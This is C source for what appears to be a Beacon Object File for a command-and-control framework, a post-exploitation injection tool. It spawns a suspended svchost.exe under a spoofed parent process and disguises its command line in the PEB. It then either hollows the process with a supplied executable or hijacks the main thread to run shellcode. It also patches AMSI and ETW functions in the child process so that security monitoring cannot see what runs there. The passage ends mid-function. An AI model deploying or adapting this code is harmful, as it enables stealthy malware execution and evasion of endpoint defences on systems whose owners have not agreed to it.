#include <windows.h>
#include <winternl.h>
#include <stddef.h>
#include <tlhelp32.h>

#include "hollow_defs.h"
#include "../No-Consolation/include/beacon.h"

#define MODE_PE        0
#define MODE_SHELLCODE 1

#define SRC_BYTES      0
#define SRC_LOCAL_PATH 1

#define OUTPUT_YES     0
#define OUTPUT_NO      1

#define DEFAULT_TIMEOUT_MS 60000
#define POLL_INTERVAL_MS   200
#define OUTPUT_CHUNK_MAX   (1024 * 64)

#define DEFAULT_SPAWNTO L"C:\\Windows\\System32\\svchost.exe"
#define DEFAULT_SPAWNTO_A "C:\\Windows\\System32\\svchost.exe"

/* ================================================================
 *  Utility
 * ================================================================ */

void *_memset(void *dest, int c, size_t n) {
    unsigned char *d = (unsigned char *)dest;
    while (n--) *d++ = (unsigned char)c;
    return dest;
}

void *_memcpy(void *dest, const void *src, size_t n) {
    unsigned char *d = (unsigned char *)dest;
    const unsigned char *s = (const unsigned char *)src;
    while (n--) *d++ = *s++;
    return dest;
}

/* ================================================================
 *  Find PID by name (for PPID spoofing)
 * ================================================================ */

static DWORD FindPidByName(const char *procName) {
    PROCESSENTRY32 pe;
    _memset(&pe, 0, sizeof(pe));
    pe.dwSize = sizeof(PROCESSENTRY32);

    HANDLE hSnap = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    DWORD pid = 0;
    if (KERNEL32$Process32First(hSnap, &pe)) {
        do {
            if (MSVCRT$_stricmp(pe.szExeFile, procName) == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (KERNEL32$Process32Next(hSnap, &pe));
    }
    KERNEL32$CloseHandle(hSnap);
    return pid;
}

/* Pick a believable parent for the spawnto process */
static DWORD FindSpoofParent(const char *spawntoA) {
    const char *name = spawntoA;
    const char *p = spawntoA;
    while (*p) {
        if (*p == '\\' || *p == '/') name = p + 1;
        p++;
    }

    if (MSVCRT$_stricmp(name, "svchost.exe") == 0)
        return FindPidByName("services.exe");
    if (MSVCRT$_stricmp(name, "RuntimeBroker.exe") == 0 ||
        MSVCRT$_stricmp(name, "dllhost.exe") == 0 ||
        MSVCRT$_stricmp(name, "taskhostw.exe") == 0)
        return FindPidByName("svchost.exe");
    if (MSVCRT$_stricmp(name, "WerFault.exe") == 0)
        return FindPidByName("svchost.exe");

    return FindPidByName("explorer.exe");
}

/* ================================================================
 *  AMSI + ETW patching in remote process
 * ================================================================ */

/* Patch a function in the remote process. Uses local module address as proxy —
   ntdll is always at the same base (ASLR shared), amsi.dll must be force-loaded first. */
static BOOL PatchRemoteFunction(HANDLE hProcess, HMODULE hLocalMod,
                                const char *funcName, BYTE *patch, DWORD patchLen) {
    FARPROC pFunc = KERNEL32$GetProcAddress(hLocalMod, funcName);
    if (!pFunc) return FALSE;

    LPVOID pRemoteFunc = (LPVOID)pFunc;

    DWORD dwOldProtect = 0;
    if (!KERNEL32$VirtualProtectEx(hProcess, pRemoteFunc, patchLen, PAGE_READWRITE, &dwOldProtect)) {
        return FALSE;
    }

    SIZE_T written = 0;
    BOOL ok = KERNEL32$WriteProcessMemory(hProcess, pRemoteFunc, patch, patchLen, &written);

    DWORD dwDummy = 0;
    KERNEL32$VirtualProtectEx(hProcess, pRemoteFunc, patchLen, dwOldProtect, &dwDummy);

    return ok && (written == patchLen);
}

/* Force-load amsi.dll into child process via CreateRemoteThread(LoadLibraryA),
   then patch AmsiScanBuffer + AmsiOpenSession */
static void PatchAMSI(HANDLE hProcess) {
    HMODULE hKernel = KERNEL32$GetModuleHandleA("kernel32.dll");
    if (!hKernel) return;

    FARPROC pLoadLib = KERNEL32$GetProcAddress(hKernel, "LoadLibraryA");
    if (!pLoadLib) return;

    const char amsiName[] = "amsi.dll";
    LPVOID pRemoteStr = KERNEL32$VirtualAllocEx(hProcess, NULL, sizeof(amsiName),
                                                 MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteStr) return;

    SIZE_T bw = 0;
    KERNEL32$WriteProcessMemory(hProcess, pRemoteStr, amsiName, sizeof(amsiName), &bw);

    HANDLE hThread = KERNEL32$CreateRemoteThread(hProcess, NULL, 0,
        (LPTHREAD_START_ROUTINE)pLoadLib, pRemoteStr, 0, NULL);
    if (hThread) {
        KERNEL32$WaitForSingleObject(hThread, 5000);
        KERNEL32$CloseHandle(hThread);
    }

    KERNEL32$VirtualFreeEx(hProcess, pRemoteStr, 0, MEM_RELEASE);

    /* Now amsi.dll is loaded in both processes at the same ASLR base */
    HMODULE hAmsi = KERNEL32$LoadLibraryA("amsi.dll");
    if (!hAmsi) return;

    BYTE amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    if (PatchRemoteFunction(hProcess, hAmsi, "AmsiScanBuffer", amsiPatch, sizeof(amsiPatch))) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] AMSI patched");
    }

    BYTE amsiOpenPatch[] = { 0xB8, 0x01, 0x00, 0x07, 0x80, 0xC3 };
    PatchRemoteFunction(hProcess, hAmsi, "AmsiOpenSession", amsiOpenPatch, sizeof(amsiOpenPatch));
}

static void PatchETW(HANDLE hProcess) {
    /* ntdll is always loaded at same base in all processes (ASLR shared) */
    HMODULE hNtdll = KERNEL32$GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    BYTE etwPatch[] = { 0x33, 0xC0, 0xC3 };
    if (PatchRemoteFunction(hProcess, hNtdll, "EtwEventWrite", etwPatch, sizeof(etwPatch))) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] ETW patched");
    }
}

/* ================================================================
 *  Section protection mapping
 * ================================================================ */

static BOOL AdjustSectionProtections(HANDLE hProcess, ULONG_PTR baseAddr,
                                     PIMAGE_NT_HEADERS pNt, PIMAGE_SECTION_HEADER pSec) {
    for (DWORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (!pSec[i].SizeOfRawData || !pSec[i].VirtualAddress) continue;

        DWORD prot = PAGE_READONLY;
        DWORD c = pSec[i].Characteristics;
        BOOL x = c & IMAGE_SCN_MEM_EXECUTE;
        BOOL r = c & IMAGE_SCN_MEM_READ;
        BOOL w = c & IMAGE_SCN_MEM_WRITE;

        if (x && w && r)      prot = PAGE_EXECUTE_READWRITE;
        else if (x && r)      prot = PAGE_EXECUTE_READ;
        else if (x && w)      prot = PAGE_EXECUTE_WRITECOPY;
        else if (x)           prot = PAGE_EXECUTE;
        else if (w && r)      prot = PAGE_READWRITE;
        else if (w)           prot = PAGE_WRITECOPY;
        else if (r)           prot = PAGE_READONLY;

        DWORD oldProt = 0;
        if (!KERNEL32$VirtualProtectEx(hProcess,
                (PVOID)(baseAddr + pSec[i].VirtualAddress),
                pSec[i].SizeOfRawData, prot, &oldProt)) {
            BeaconPrintf(CALLBACK_ERROR, "VirtualProtectEx section %d error: %lu",
                         i, KERNEL32$GetLastError());
            return FALSE;
        }
    }
    return TRUE;
}

/* ================================================================
 *  Output capture
 * ================================================================ */

static void DrainPipe(HANDLE hPipe) {
    for (;;) {
        DWORD avail = 0;
        if (!KERNEL32$PeekNamedPipe(hPipe, NULL, 0, NULL, &avail, NULL) || avail == 0) return;

        DWORD toRead = avail < OUTPUT_CHUNK_MAX ? avail : OUTPUT_CHUNK_MAX;
        BYTE *buf = (BYTE*)KERNEL32$LocalAlloc(0x40 /*LPTR*/, toRead + 1);
        if (!buf) return;

        DWORD bytesRead = 0;
        if (KERNEL32$ReadFile(hPipe, buf, toRead, &bytesRead, NULL) && bytesRead > 0) {
            buf[bytesRead] = '\0';
            BeaconOutput(CALLBACK_OUTPUT, (char*)buf, bytesRead);
        }
        KERNEL32$LocalFree(buf);

        if (bytesRead < toRead) return;
    }
}

static void CollectOutput(HANDLE hProcess, HANDLE hPipe, DWORD timeoutMs) {
    DWORD elapsed = 0;
    DWORD exitCode = 259; /* STILL_ACTIVE */

    while (elapsed < timeoutMs) {
        if (!KERNEL32$GetExitCodeProcess(hProcess, &exitCode)) break;
        if (exitCode != 259) break;

        DrainPipe(hPipe);
        KERNEL32$Sleep(POLL_INTERVAL_MS);
        elapsed += POLL_INTERVAL_MS;
    }

    DrainPipe(hPipe);

    if (elapsed >= timeoutMs && exitCode == 259) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] Timeout (%lus), terminating child", timeoutMs / 1000);
        KERNEL32$TerminateProcess(hProcess, 1);
    }
}

/* ================================================================
 *  Create suspended process with PPID spoof + BlockDLLs
 * ================================================================ */

typedef struct {
    STARTUPINFOEXA si;
    LPPROC_THREAD_ATTRIBUTE_LIST attrList;
    HANDLE hParent;
    HANDLE hPipeOutRead;
    HANDLE hPipeOutWrite;
    HANDLE hPipeInRead;
    HANDLE hPipeInWrite;
    PROCESS_INFORMATION pi;
} SPAWN_CTX;

static void SpawnCleanup(SPAWN_CTX *ctx, BOOL keepProc) {
    if (ctx->attrList) {
        KERNEL32$DeleteProcThreadAttributeList(ctx->attrList);
        KERNEL32$LocalFree(ctx->attrList);
        ctx->attrList = NULL;
    }
    if (ctx->hParent) { KERNEL32$CloseHandle(ctx->hParent); ctx->hParent = NULL; }
    if (ctx->hPipeInRead) { KERNEL32$CloseHandle(ctx->hPipeInRead); ctx->hPipeInRead = NULL; }
    if (ctx->hPipeOutWrite) { KERNEL32$CloseHandle(ctx->hPipeOutWrite); ctx->hPipeOutWrite = NULL; }
    if (!keepProc) {
        if (ctx->hPipeOutRead) { KERNEL32$CloseHandle(ctx->hPipeOutRead); ctx->hPipeOutRead = NULL; }
        if (ctx->hPipeInWrite) { KERNEL32$CloseHandle(ctx->hPipeInWrite); ctx->hPipeInWrite = NULL; }
        if (ctx->pi.hProcess) {
            KERNEL32$TerminateProcess(ctx->pi.hProcess, 1);
            KERNEL32$CloseHandle(ctx->pi.hProcess);
            ctx->pi.hProcess = NULL;
        }
        if (ctx->pi.hThread) { KERNEL32$CloseHandle(ctx->pi.hThread); ctx->pi.hThread = NULL; }
    }
}

static BOOL SpawnSuspended(const char *spawntoA, BOOL wantOutput, BOOL blockDlls,
                           BOOL noPpid, SPAWN_CTX *ctx) {
    _memset(ctx, 0, sizeof(SPAWN_CTX));
    ctx->si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    SECURITY_ATTRIBUTES sa;
    _memset(&sa, 0, sizeof(sa));
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    /* Pipes for output capture */
    if (wantOutput) {
        if (!KERNEL32$CreatePipe(&ctx->hPipeOutRead, &ctx->hPipeOutWrite, &sa, 0)) {
            BeaconPrintf(CALLBACK_ERROR, "CreatePipe out: %lu", KERNEL32$GetLastError());
            return FALSE;
        }
        if (!KERNEL32$CreatePipe(&ctx->hPipeInRead, &ctx->hPipeInWrite, &sa, 0)) {
            BeaconPrintf(CALLBACK_ERROR, "CreatePipe in: %lu", KERNEL32$GetLastError());
            SpawnCleanup(ctx, FALSE);
            return FALSE;
        }
        KERNEL32$SetHandleInformation(ctx->hPipeOutRead, 1/*HANDLE_FLAG_INHERIT*/, 0);
        KERNEL32$SetHandleInformation(ctx->hPipeInWrite, 1, 0);

        ctx->si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
        ctx->si.StartupInfo.wShowWindow = SW_HIDE;
        ctx->si.StartupInfo.hStdInput  = ctx->hPipeInRead;
        ctx->si.StartupInfo.hStdOutput = ctx->hPipeOutWrite;
        ctx->si.StartupInfo.hStdError  = ctx->hPipeOutWrite;
    } else {
        ctx->si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
        ctx->si.StartupInfo.wShowWindow = SW_HIDE;
    }

    /* Must live until CreateProcessA — UpdateProcThreadAttribute stores pointer, not value */
    DWORD64 blockDllsPolicy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;

    /* PPID spoofing */
    if (!noPpid) {
        DWORD parentPid = FindSpoofParent(spawntoA);
        if (parentPid) {
            ctx->hParent = KERNEL32$OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parentPid);
            if (ctx->hParent) {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] PPID spoof target: PID %lu", parentPid);
            }
        }
    }

    /* Attribute count: PPID (if available) + BlockDLLs (if requested) */
    DWORD attrCount = 0;
    if (ctx->hParent) attrCount++;
    if (blockDlls) attrCount++;

    if (attrCount > 0) {
        SIZE_T attrSize = 0;
        KERNEL32$InitializeProcThreadAttributeList(NULL, attrCount, 0, &attrSize);
        ctx->attrList = (LPPROC_THREAD_ATTRIBUTE_LIST)KERNEL32$LocalAlloc(0x40, attrSize);
        if (!ctx->attrList || !KERNEL32$InitializeProcThreadAttributeList(ctx->attrList, attrCount, 0, &attrSize)) {
            BeaconPrintf(CALLBACK_ERROR, "InitializeProcThreadAttributeList: %lu", KERNEL32$GetLastError());
            SpawnCleanup(ctx, FALSE);
            return FALSE;
        }

        if (ctx->hParent) {
            if (!KERNEL32$UpdateProcThreadAttribute(ctx->attrList, 0,
                    PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    &ctx->hParent, sizeof(HANDLE), NULL, NULL)) {
                BeaconPrintf(CALLBACK_OUTPUT, "[!] PPID spoof failed (%lu), continuing without", KERNEL32$GetLastError());
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] PPID spoofed");
            }
        }

        if (blockDlls) {
            if (!KERNEL32$UpdateProcThreadAttribute(ctx->attrList, 0,
                    PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                    &blockDllsPolicy, sizeof(blockDllsPolicy), NULL, NULL)) {
                BeaconPrintf(CALLBACK_OUTPUT, "[!] BlockDLLs failed (%lu), continuing without", KERNEL32$GetLastError());
            } else {
                BeaconPrintf(CALLBACK_OUTPUT, "[+] BlockDLLs enabled");
            }
        }

        ctx->si.lpAttributeList = ctx->attrList;
    }

    /* Build fake command line */
    char fakeCmd[512];
    _memset(fakeCmd, 0, sizeof(fakeCmd));
    MSVCRT$_snprintf(fakeCmd, sizeof(fakeCmd) - 1, "%s -k LocalServiceNetworkRestricted", spawntoA);

    DWORD flags = CREATE_SUSPENDED | CREATE_NO_WINDOW;
    if (attrCount > 0) flags |= EXTENDED_STARTUPINFO_PRESENT;

    if (!KERNEL32$CreateProcessA(NULL, fakeCmd, NULL, NULL, wantOutput ? TRUE : FALSE,
            flags, NULL, NULL, (LPSTARTUPINFOA)&ctx->si, &ctx->pi)) {
        BeaconPrintf(CALLBACK_ERROR, "CreateProcessA: %lu", KERNEL32$GetLastError());
        SpawnCleanup(ctx, FALSE);
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Spawned %s (PID %lu) suspended", spawntoA, ctx->pi.dwProcessId);

    /* Close inherited ends */
    if (ctx->hPipeOutWrite) { KERNEL32$CloseHandle(ctx->hPipeOutWrite); ctx->hPipeOutWrite = NULL; }
    if (ctx->hPipeInRead)   { KERNEL32$CloseHandle(ctx->hPipeInRead);   ctx->hPipeInRead = NULL; }
    if (ctx->attrList) {
        KERNEL32$DeleteProcThreadAttributeList(ctx->attrList);
        KERNEL32$LocalFree(ctx->attrList);
        ctx->attrList = NULL;
    }
    if (ctx->hParent) { KERNEL32$CloseHandle(ctx->hParent); ctx->hParent = NULL; }

    return TRUE;
}

/* ================================================================
 *  Spoof command line in PEB after creation
 * ================================================================ */

static BOOL SpoofCommandLine(HANDLE hProcess, const char *realCmdA) {
    PROCESS_BASIC_INFORMATION pbi;
    _memset(&pbi, 0, sizeof(pbi));

    NTSTATUS st = NTDLL$NtQueryInformationProcess(hProcess, 0/*ProcessBasicInformation*/,
                                                   &pbi, sizeof(pbi), NULL);
    if (st != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[!] PEB read failed (0x%lx), args visible in fake form", st);
        return FALSE;
    }

    PEB peb;
    _memset(&peb, 0, sizeof(peb));
    SIZE_T br = 0;
    if (!KERNEL32$ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &br))
        return FALSE;

    RTL_USER_PROCESS_PARAMETERS params;
    _memset(&params, 0, sizeof(params));
    if (!KERNEL32$ReadProcessMemory(hProcess, peb.ProcessParameters, &params, sizeof(params), &br))
        return FALSE;

    int wideLen = KERNEL32$MultiByteToWideChar(0/*CP_ACP*/, 0, realCmdA, -1, NULL, 0);
    if (wideLen == 0) return FALSE;

    LPWSTR wideBuf = (LPWSTR)KERNEL32$LocalAlloc(0x40, wideLen * sizeof(WCHAR));
    if (!wideBuf) return FALSE;

    KERNEL32$MultiByteToWideChar(0, 0, realCmdA, -1, wideBuf, wideLen);

    SIZE_T bw = 0;
    KERNEL32$WriteProcessMemory(hProcess, params.CommandLine.Buffer, wideBuf,
                                wideLen * sizeof(WCHAR), &bw);

    USHORT newLen = (USHORT)((wideLen - 1) * sizeof(WCHAR));
    KERNEL32$WriteProcessMemory(hProcess,
        (PBYTE)peb.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length),
        &newLen, sizeof(USHORT), &bw);

    KERNEL32$LocalFree(wideBuf);
    return TRUE;
}

/* ================================================================
 *  PE Hollowing core
 * ================================================================ */

static BOOL HollowWithPE(HANDLE hProcess, HANDLE hThread, BYTE *peData, DWORD peSize,
                         const char *argsA, const char *spawntoA) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)peData;
    if (peSize < sizeof(IMAGE_DOS_HEADER) || pDos->e_magic != IMAGE_DOS_SIGNATURE) {
        BeaconPrintf(CALLBACK_ERROR, "Invalid PE: bad DOS header");
        return FALSE;
    }

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(peData + pDos->e_lfanew);
    if ((BYTE*)pNt + sizeof(IMAGE_NT_HEADERS) > peData + peSize) {
        BeaconPrintf(CALLBACK_ERROR, "Invalid PE: NT headers out of bounds");
        return FALSE;
    }
    if (pNt->Signature != IMAGE_NT_SIGNATURE) {
        BeaconPrintf(CALLBACK_ERROR, "Invalid PE: bad NT signature");
        return FALSE;
    }
    if (pNt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        BeaconPrintf(CALLBACK_ERROR, "PE is not x64");
        return FALSE;
    }

    /* Allocate at preferred base, fall back to any address */
    BYTE *pRemote = (BYTE*)KERNEL32$VirtualAllocEx(hProcess,
        (PVOID)pNt->OptionalHeader.ImageBase,
        pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!pRemote) {
        pRemote = (BYTE*)KERNEL32$VirtualAllocEx(hProcess, NULL,
            pNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }
    if (!pRemote) {
        BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx: %lu", KERNEL32$GetLastError());
        return FALSE;
    }

    /* Relocate if needed */
    if (pRemote != (BYTE*)pNt->OptionalHeader.ImageBase) {
        ULONG_PTR delta = (ULONG_PTR)pRemote - pNt->OptionalHeader.ImageBase;
        IMAGE_DATA_DIRECTORY relocDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

        if (relocDir.Size == 0) {
            BeaconPrintf(CALLBACK_ERROR, "Relocation needed but PE has no .reloc section");
            KERNEL32$VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
            return FALSE;
        }

        BYTE *pBlock = peData + relocDir.VirtualAddress;
        DWORD processed = 0;
        while (processed < relocDir.Size) {
            DWORD pageRva   = *(DWORD*)(pBlock);
            DWORD blockSize = *(DWORD*)(pBlock + 4);
            if (blockSize == 0) break;

            DWORD entryCount = (blockSize - 8) / 2;
            WORD *entries = (WORD*)(pBlock + 8);

            for (DWORD j = 0; j < entryCount; j++) {
                BYTE type = (BYTE)(entries[j] >> 12);
                WORD offset = entries[j] & 0x0FFF;
                if (type == IMAGE_REL_BASED_DIR64) {
                    ULONG_PTR *pPatch = (ULONG_PTR*)(peData + pageRva + offset);
                    *pPatch += delta;
                } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                    DWORD *pPatch = (DWORD*)(peData + pageRva + offset);
                    *pPatch += (DWORD)delta;
                }
            }
            pBlock += blockSize;
            processed += blockSize;
        }
        pNt->OptionalHeader.ImageBase = (ULONG_PTR)pRemote;
    }

    /* Write headers */
    SIZE_T bw = 0;
    if (!KERNEL32$WriteProcessMemory(hProcess, pRemote, peData,
            pNt->OptionalHeader.SizeOfHeaders, &bw)) {
        BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory headers: %lu", KERNEL32$GetLastError());
        return FALSE;
    }

    /* Write sections */
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
    for (int i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (pSec[i].SizeOfRawData == 0) continue;
        if (!KERNEL32$WriteProcessMemory(hProcess, pRemote + pSec[i].VirtualAddress,
                peData + pSec[i].PointerToRawData, pSec[i].SizeOfRawData, &bw)) {
            BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory section %d: %lu",
                         i, KERNEL32$GetLastError());
            return FALSE;
        }
    }

    /* Set proper section protections */
    AdjustSectionProtections(hProcess, (ULONG_PTR)pRemote, pNt, pSec);

    /* Update thread context — set entry point + PEB image base */
    CONTEXT ctx;
    _memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_ALL;

    if (!KERNEL32$GetThreadContext(hThread, &ctx)) {
        BeaconPrintf(CALLBACK_ERROR, "GetThreadContext: %lu", KERNEL32$GetLastError());
        return FALSE;
    }

    /* Update PEB ImageBase */
    ULONG_PTR pebImageBase = ctx.Rdx + offsetof(PEB, Reserved3[1]);
    ULONG_PTR newBase = (ULONG_PTR)pRemote;
    KERNEL32$WriteProcessMemory(hProcess, (PVOID)pebImageBase, &newBase, sizeof(ULONG_PTR), &bw);

    /* Set RCX to entry point */
    ctx.Rcx = (DWORD64)(pRemote + pNt->OptionalHeader.AddressOfEntryPoint);

    if (!KERNEL32$SetThreadContext(hThread, &ctx)) {
        BeaconPrintf(CALLBACK_ERROR, "SetThreadContext: %lu", KERNEL32$GetLastError());
        return FALSE;
    }

    /* Spoof command line in PEB — use actual spawnto basename */
    if (argsA && argsA[0]) {
        const char *basename = spawntoA;
        const char *s = spawntoA;
        while (*s) { if (*s == '\\' || *s == '/') basename = s + 1; s++; }

        char realCmd[4096];
        _memset(realCmd, 0, sizeof(realCmd));
        MSVCRT$_snprintf(realCmd, sizeof(realCmd) - 1, "%s %s", basename, argsA);
        SpoofCommandLine(hProcess, realCmd);
    }

    /* Patch AMSI + ETW before resume */
    PatchAMSI(hProcess);
    PatchETW(hProcess);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] PE hollowed at 0x%p, entry 0x%p",
                 pRemote, (void*)ctx.Rcx);
    return TRUE;
}

/* ================================================================
 *  Shellcode injection
 * ================================================================ */

static BOOL InjectShellcode(HANDLE hProcess, HANDLE hThread, BYTE *scData, DWORD scSize) {
    if (scSize == 0) {
        BeaconPrintf(CALLBACK_ERROR, "Shellcode is empty");
        return FALSE;
    }

    LPVOID pRemote = KERNEL32$VirtualAllocEx(hProcess, NULL, scSize,
                                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemote) {
        BeaconPrintf(CALLBACK_ERROR, "VirtualAllocEx shellcode: %lu", KERNEL32$GetLastError());
        return FALSE;
    }

    SIZE_T bw = 0;
    if (!KERNEL32$WriteProcessMemory(hProcess, pRemote, scData, scSize, &bw)) {
        BeaconPrintf(CALLBACK_ERROR, "WriteProcessMemory shellcode: %lu", KERNEL32$GetLastError());
        return FALSE;
    }

    DWORD oldProt = 0;
    KERNEL32$VirtualProtectEx(hProcess, pRemote, scSize, PAGE_EXECUTE_READ, &oldProt);

    PatchETW(hProcess);

    /* Hijack the suspended main thread — set RIP to shellcode, then resume.
       This avoids CreateRemoteThread (extra detection surface) and ensures
       the process has a running main thread. */
    CONTEXT ctx;
    _memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_ALL;

    if (!KERNEL32$GetThreadContext(hThread, &ctx)) {
        BeaconPrintf(CALLBACK_ERROR, "GetThreadContext: %lu", KERNEL32$GetLastError());
        return FALSE;
    }

    ctx.Rip = (DWORD64)pRemote;

    if (!KERNEL32$SetThreadContext(hThread, &ctx)) {
        BeaconPrintf(CALLBACK_ERROR, "SetThreadContext: %lu", KERNEL32$GetLastError());
        return FALSE;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Shellcode injected at 0x%p (%lu bytes), thread hijacked", pRemote, scSize);
    return TRUE;
}

/* ================================================================
 *  Read PE from local path on target
 * ================================================================ */

static BYTE* ReadLocalFile(const char *path, DWORD *outSize) {
    *outSize = 0;

    HANDLE hFile = KERNEL32$CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                                         NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "Cannot open %s: %lu", path, KERNEL32$GetLastError());
        return NULL;
    }

    DWORD fileSize = KERNEL32$GetFileSize(hFile, NULL);
    if (fileSize == 0 || fileSize == INVALID_FILE_SIZE) {
        BeaconPrintf(CALLBACK_ERROR, "Bad file size: %s", path);
        KERNEL32$CloseHandle(hFile);
        return NULL;
    }

    BYTE *buf = (BYTE*)KERNEL32$LocalAlloc(0x40, fileSize);
    if (!buf) {
        KERNEL32$CloseHandle(hFile);
        return NULL;
    }

    DWORD bytesRead = 0;
    if (!KERNEL32$ReadFile(hFile, buf, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        BeaconPrintf(CALLBACK_ERROR, "ReadFile %s: %lu", path, KERNEL32$GetLastError());
        KERNEL32$LocalFree(buf);
        KERNEL32$CloseHandle(hFile);
        return NULL;
    }

    KERNEL32$CloseHandle(hFile);
    *outSize = fileSize;
    return buf;
}


/* ================================================================
 *  BOF entry point
 * ================================================================ */

/* Argument packing from .axs:
 *   int     mode          (0=PE, 1=shellcode)
 *   int     source        (0=bytes in arg, 1=path on target)
 *   int     noOutput      (0=capture, 1=no output)
 *   int     timeout_ms
 *   int     blockDlls     (0=no, 1=yes)
 *   int     noPpid        (0=spoof, 1=no spoof)
 *   cstr    spawnto       (empty = default)
 *   cstr    args          (PE arguments, can be empty)
 *   cstr    localPath     (if source=1, path on target)
 *   bytes   peBytes       (if source=0, raw PE/shellcode bytes)
 */

void go(char *rawArgs, int rawLen) {
    datap parser;
    BeaconDataParse(&parser, rawArgs, rawLen);

    int mode       = BeaconDataInt(&parser);
    int source     = BeaconDataInt(&parser);
    int noOutput   = BeaconDataInt(&parser);
    int timeoutMs  = BeaconDataInt(&parser);
    int blockDlls  = BeaconDataInt(&parser);
    int noPpid     = BeaconDataInt(&parser);

    int spawntoLen = 0;
    char *spawnto  = BeaconDataExtract(&parser, &spawntoLen);

    int argsLen = 0;
    char *args  = BeaconDataExtract(&parser, &argsLen);

    int localPathLen = 0;
    char *localPath  = BeaconDataExtract(&parser, &localPathLen);

    int peDataLen = 0;
    char *peData  = BeaconDataExtract(&parser, &peDataLen);

    /* Defaults */
    const char *spawntoA = DEFAULT_SPAWNTO_A;
    if (spawnto && spawnto[0]) spawntoA = spawnto;

    if (timeoutMs <= 0) timeoutMs = DEFAULT_TIMEOUT_MS;
    BOOL wantOutput = (noOutput == OUTPUT_NO) ? FALSE : TRUE;

    /* Get PE/shellcode bytes */
    BYTE *payloadData = NULL;
    DWORD payloadSize = 0;
    BOOL freePayload = FALSE;

    if (source == SRC_LOCAL_PATH) {
        if (!localPath || !localPath[0]) {
            BeaconPrintf(CALLBACK_ERROR, "No local path provided");
            return;
        }
        payloadData = ReadLocalFile(localPath, &payloadSize);
        if (!payloadData) return;
        freePayload = TRUE;
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Read %lu bytes from %s", payloadSize, localPath);
    } else {
        if (!peData || peDataLen <= 0) {
            BeaconPrintf(CALLBACK_ERROR, "No payload bytes received");
            return;
        }
        payloadData = (BYTE*)peData;
        payloadSize = (DWORD)peDataLen;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Mode: %s | Output: %s | Timeout: %ds | Spawnto: %s",
                 mode == MODE_PE ? "PE" : "Shellcode",
                 wantOutput ? "yes" : "no",
                 timeoutMs / 1000,
                 spawntoA);

    /* Create suspended process */
    SPAWN_CTX sctx;
    if (!SpawnSuspended(spawntoA, wantOutput, blockDlls, noPpid, &sctx)) {
        if (freePayload) KERNEL32$LocalFree(payloadData);
        return;
    }

    BOOL ok = FALSE;

    if (mode == MODE_PE) {
        ok = HollowWithPE(sctx.pi.hProcess, sctx.pi.hThread,
                          payloadData, payloadSize, args, spawntoA);
    } else {
        ok = InjectShellcode(sctx.pi.hProcess, sctx.pi.hThread,
                             payloadData, payloadSize);
    }

    if (freePayload) {
        KERNEL32$LocalFree(payloadData);
        payloadData = NULL;
    }

    if (!ok) {
        BeaconPrintf(CALLBACK_ERROR, "Payload deployment failed, cleaning up");
        SpawnCleanup(&sctx, FALSE);
        return;
    }

    /* Resume — both PE hollowing and shellcode hijack the main thread */
    if (KERNEL32$ResumeThread(sctx.pi.hThread) == (DWORD)-1) {
        BeaconPrintf(CALLBACK_ERROR, "ResumeThread: %lu", KERNEL32$GetLastError());
        SpawnCleanup(&sctx, FALSE);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Process resumed");

    /* Collect output or fire-and-forget */
    if (wantOutput && sctx.hPipeOutRead) {
        CollectOutput(sctx.pi.hProcess, sctx.hPipeOutRead, (DWORD)timeoutMs);
    } else if (!wantOutput) {
